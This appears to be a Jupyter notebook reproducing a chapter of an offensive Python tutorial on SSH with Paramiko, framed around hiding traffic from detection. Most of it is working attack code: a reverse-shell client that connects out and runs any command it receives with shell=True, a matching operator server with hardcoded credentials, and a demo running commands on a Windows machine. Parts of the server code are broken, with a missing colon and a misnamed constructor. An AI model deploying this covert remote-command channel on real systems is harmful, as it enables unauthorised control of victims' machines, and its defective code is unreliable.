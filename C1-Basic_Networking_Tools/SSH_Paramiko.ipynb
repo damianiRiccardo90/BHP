{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO10gSxtMgYnNRNBuBwvV7W",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C1-Basic_Networking_Tools/SSH_Paramiko.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__SSH with Paramiko__*\n",
        "\n",
        "Pivoting with __BHNET__, the __netcat__ replacement we built, is pretty handy, but sometimes it's wise to encrypt your traffic to avoid detection. A common means of doing so is to tunnel the traffic using __Secure Shell__ (__SSH__). But what if your target doesn't have an SSH client, just like 99.81943 percent of Winzozz systems?\n",
        "\n",
        "While there are great SSH clients available for Winzozz, like __PuTTY__, this is a book about Python. In Python, you could use raw sockets and some crypto magic to create your own __SSH__ client or server, but why create when you can reuse? __Paramiko__, which uses __PyCrypto__, gives you simple access to the __SSH2__ protocol.\n",
        "\n",
        "To learn about how this library works, we'll use __Paramiko__ to make a connection and run a command on an SSH system, configure an SSH server and SSH client to run remote commands on a winzozz machine, and finally puzzle out the reverse tunnel demo file included with Paramiko to duplicate the proxy option of __BHNET__. Let's begin.\n",
        "\n",
        "First, grab Paramiko by using the __pip installer__ (or download it from [paramiko website](http://www.paramiko.org/)).\n",
        "```\n",
        "pip install paramiko\n",
        "```\n",
        "We'll use some of the demo files later, so make sure you download them from the [Paramiko Github repo](https://github.com/paramiko/paramiko/).\n",
        "\n",
        "Create a new file called __ssh_cmd.py__ and enter the following:"
      ],
      "metadata": {
        "id": "BQpB8c_AGxDT"
      }
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "PN6GOURMe-Va"
      },
      "outputs": [],
      "source": [
        "import paramiko\n",
        "\n",
        "def ssh_command(ip, port, user, passwd, cmd): #[1]\n",
        "    client = paramiko.SSHClient()\n",
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #[2]\n",
        "    client.connect(ip, port=port, username=user, password=passwd)\n",
        "\n",
        "    _, stdout, stderr = client.exec_command(cmd) #[3]\n",
        "    output = stdout.readlines() + stderr.readlines()\n",
        "    if output:\n",
        "        print('--- Output ---')\n",
        "        for line in output:\n",
        "            print(line.strip())\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    import getpass #[4]\n",
        "    # user = getpass.getuser()\n",
        "    user = input('Username: ')\n",
        "    password = getpass.getpass()\n",
        "\n",
        "    ip = input('Enter server IP: ') or '192.168.1.203'\n",
        "    port = input('Enter port or <CR> ') or 2222\n",
        "    cmd = input('Enter command or <CR>: ') or 'id'\n",
        "    ssh_command(ip, port, user, password, cmd) #[5]"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "We create a function called __ssh_command__ __[1]__, which makes a connection to an SSH server and runs a single command. Note that Paramiko supports authentication with keys instead of (or in addition to) password authentication. You should use SSH key authentication in a real engagement, but for ease of use in this example, we'll stick with the traditional username and password authentication.\n",
        "\n",
        "Because we're controlling both ends of this connection, we set the policy to accept the SSH key for the SSH server we're connectiong to __[2]__ and make the connection. Assuming the connection is made, we run the command __[3]__ that we passed in the call to the __ssh_command__ function. Then, if the command produced output, we print each line of the output.\n",
        "\n",
        "In the main block, we use a new module, __getpass__ __[4]__. You can use it to get the username from the current environment, but since our username is different on the two machines, we explicitly ask for the username on the command line. We then use the __getpass__ function to request the password (the response will not be displayed on the console to frustrate any shoulder-surfers). Then we get the IP, port, and command (__cmd__) to run and send it to be executed __[5]__.\n",
        "\n",
        "Let's run a quick test by connecting to our Linux server:\n",
        "```\n",
        "% python ssh_cmd.py\n",
        "Username: rick\n",
        "Password\n",
        "Enter server IP: 192.168.1.203\n",
        "Enter port or <CR>: 22\n",
        "Enter command or <CR>: id\n",
        "--- Output ---\n",
        "uid=1000(rick) git=1000(rick) groups=1000(tim),27(sudo)\n",
        "```\n",
        "You'll see that we connect and then run the command. You can easily modify this script to run multiple commands on an SSH server, or run commands on multiple SSH servers.\n",
        "\n",
        "With the basics done, let's modify the script so it can run commands on the Winzozz client over SSH. Of course, when using SSH, you'd normally use an SSH client to connect to an SSH server, but because most versions of Winzozz don't include an SSH server out of the box, we need to reverse this and send commands from an SSH server to the SSH client.\n",
        "\n",
        "Create a new file called __ssh_rcmd.py__ and enter the following:"
      ],
      "metadata": {
        "id": "oitJwdjz4QEy"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import paramiko\n",
        "import shlex\n",
        "import subprocess\n",
        "\n",
        "def ssh_command(ip, port, user, passwd, command):\n",
        "    client = paramiko.SSHClient()\n",
        "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
        "    client.connect(ip, port=port, username=user, password=passwd)\n",
        "\n",
        "    ssh_session = client.get_transport().open_session()\n",
        "    if ssh_session.active:\n",
        "        ssh_session.send(command)\n",
        "        print(ssh_session.recv(1024).decode())\n",
        "        while True:\n",
        "            command = ssh_session.recv(1024) #[1]\n",
        "            try:\n",
        "                cmd = command.decode()\n",
        "                if cmd == 'exit':\n",
        "                    client.close()\n",
        "                    break\n",
        "                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) #[2]\n",
        "                ssh_session.send(cmd_output or 'okay') #[3]\n",
        "            except Exception as e:\n",
        "                ssh_session.send(str(e))\n",
        "        client.close()\n",
        "    return\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    import getpass\n",
        "    user = getpass.getuser()\n",
        "    password = getpass.getpass()\n",
        "\n",
        "    ip = input('Enter server IP: ')\n",
        "    port = input('Enter port: ')\n",
        "    ssh_command(ip, port, user, password, 'ClientConnected') #[4]"
      ],
      "metadata": {
        "id": "nCMvyUPN8XNV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "The program begins as last one did, and the new stuff starts in the __while True:__ loop. In this loop, instead of executing a single command, as we did in the previous example, we take commands from the connection __[1]__, execute the command __[2]__, and send any output back to the caller __[3]__.\n",
        "\n",
        "Also, notice that the first command we send is __ClientConnected__ __[4]__. You'll see why when we create the other end of the SSH connection.\n",
        "\n",
        "Now let's write a program that creates an SSH server for our SSH client (where we'll run commands) to connect to. This could be a Linux, Winzozz, or even merdOS system that has Python and Paramiko installed.\n",
        "\n",
        "Create a new file called __ssh_server.py__ and enter the following:"
      ],
      "metadata": {
        "id": "AuLipvrX-3Sn"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import os\n",
        "import paramiko\n",
        "import socket\n",
        "import sys\n",
        "import threading\n",
        "\n",
        "CWD = os.path.dirname(os.path.realpath(__file__))\n",
        "HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key')) #[1]\n",
        "\n",
        "class Server(paramiko.ServerInterface): #[2]\n",
        "    def _init_(self):\n",
        "        self.event = threading.Event()\n",
        "\n",
        "    def check_channel_request(self, kind, chanid):\n",
        "        if kind == 'session':\n",
        "            return paramiko.OPEN_SUCCEEDED\n",
        "        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\n",
        "\n",
        "    def check_auth_password(self, username, password):\n",
        "        if (username == 'rick') and (password == 'sekret')\n",
        "            return paramiko.AUTH_SUCCESSFUL\n",
        "    \n",
        "if __name__ == '__main__':\n",
        "    server = '192.168.1.207'\n",
        "    ssh_port = 2222\n",
        "    try:\n",
        "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
        "        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n",
        "        sock.bind((server, ssh_port)) #[3]\n",
        "        sock.listen(100)\n",
        "        print('[+] Listening for connection ...')\n",
        "        client, addr = sock.accept()\n",
        "    except Exception as e:\n",
        "        print('[-] Listen failed: ' + str(e))\n",
        "        sys.exit(1)\n",
        "    else:\n",
        "        print('[+] Got a connection!', client, addr)\n",
        "\n",
        "    bhSession = paramiko.Transport(client) #[4]\n",
        "    bhSession.add_server_key(HOSTKEY)\n",
        "    server = Server()\n",
        "    bhSession.start_server(server=server)\n",
        "\n",
        "    chan = bhSession.accept(20)\n",
        "    if chan is None:\n",
        "        print('*** No channel.')\n",
        "        sys.exit(1)\n",
        "    \n",
        "    print('[+] Authenticated!') #[5]\n",
        "    print(chan.recv(1024)) #[6]\n",
        "    chan.send('Welcome to bh_ssh')\n",
        "    try:\n",
        "        while True:\n",
        "            command = input(\"Enter command: \")\n",
        "            if command != 'exit':\n",
        "                chan.send(command)\n",
        "                r = chan.recv(8192)\n",
        "                print(r.decode())\n",
        "            else:\n",
        "                chan.send('exit')\n",
        "                print('exiting')\n",
        "                bhSession.close()\n",
        "                break\n",
        "    except KeyboardInterrupt:\n",
        "        bhSession.close()"
      ],
      "metadata": {
        "id": "r8U13Vq-_yRQ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Fro this example, we're using the SSH key included in the Paramiko demo files __[1]__. We start a socket listener __[3]__, just as we did earlier in the chapter, and then \"SSH-inize\" it __[2]__ and configure the authentication methods __[4]__. When a client has authenticated __[5]__ and sent us the __ClientConnected__ message __[6]__, any command we type into the SSH server (the machine running __ssh_server.py__) is sent to the SSH client (the machine running __ssh_rcmd.py__) and executed on the SSH client, which returns the output to SSH server.\n",
        "\n",
        "Let's give it a go."
      ],
      "metadata": {
        "id": "XOhw_YasEORY"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# *__Kicking the Tires__*\n",
        "\n",
        "For the demo, we'll run the client on our (the authors') Winzozz machine and the server on a MacMerd. Here we start up the server:\n",
        "```\n",
        "% python ssh_server.py\n",
        "[+] Listening for connection ...\n",
        "```\n",
        "Now, on the Winzozz machine, we start the client:\n",
        "```\n",
        "C:\\Users\\rick>: $ python ssh_rcmd.py\n",
        "Password:\n",
        "Welcome to bh_ssh\n",
        "```\n",
        "And back on the server, we see the connection:\n",
        "```\n",
        "[+] Got a connection! from ('192.168.1.208', 61852)\n",
        "[+] Authinticated!\n",
        "ClientConnected\n",
        "Enter command: whoami\n",
        "desktop-cc91n7i\\rick\n",
        "\n",
        "Enter command: ipconfig\n",
        "Windows IP Configuration\n",
        "<snip>\n",
        "```\n",
        "You can see that the client is successfully connected, at which point we run some commands. We don't see anything in the SSH client, but the command we sent is executed on the client, and the output is sent to our SSH server."
      ],
      "metadata": {
        "id": "OGJH1YJYFEXR"
      }
    }
  ]
}